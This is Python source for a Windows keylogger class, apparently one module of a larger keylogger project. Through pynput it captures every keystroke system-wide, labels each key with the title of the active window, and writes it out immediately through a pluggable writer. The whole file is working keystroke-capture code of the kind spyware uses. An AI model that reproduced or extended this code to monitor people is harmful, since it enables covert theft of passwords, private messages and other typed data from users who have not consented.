from pynput import keyboard
from typing import List
import re
from factories.window_title_factory import WindowTitleFactory
from interfaces.i_writer import IWriter
from interfaces.i_key_logger import IKeyLogger

class WindowsKeyLogger(IKeyLogger):
    def __init__(self, writer: IWriter):
        self.writer = writer
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.logged_keys: List[str] = []
        self.window_title_service = WindowTitleFactory.create_window_title()

    def clean_window_title(self, title: str) -> str:
        """Remove special characters and normalize the window title"""
        # Remove Right-to-Left and Left-to-Right marks and other special characters
        clean_title = re.sub(r'[\u200e\u200f\u202a\u202b\u202c\u202d\u202e]', '', title)
        # Remove multiple spaces
        clean_title = ' '.join(clean_title.split())
        return clean_title

    def on_press(self, key):
        """callback function that is called when a key is pressed"""
        try:
            key_str = str(key.char)  # Regular characters including Hebrew
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "BACKSPACE",
                keyboard.Key.shift: "SHIFT",
                keyboard.Key.ctrl_l: "CTRL_L",
                keyboard.Key.ctrl_r: "CTRL_R",
                keyboard.Key.alt_l: "ALT_L",
                keyboard.Key.alt_r: "ALT_R",
                keyboard.Key.tab: "TAB",
                keyboard.Key.esc: "ESCAPE"
            }
            key_str = special_keys.get(key, str(key)) # convert special keys to string
             
        self.logged_keys.append(key_str)
        # TODO: Write only if there is a timeout
        self.writer.write(f"[Window: {self.clean_window_title(self.window_title_service.get_active_window_title())}] Key: {key_str}\n") # Write each key immediately
        
    def on_release(self, key):
        """callback function that is called when a key is released"""
        if key == keyboard.Key.esc:
            return False  # stop listener

    def start(self):
        self.listener.start()
        self.listener.join()

    def stop(self):
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.logged_keys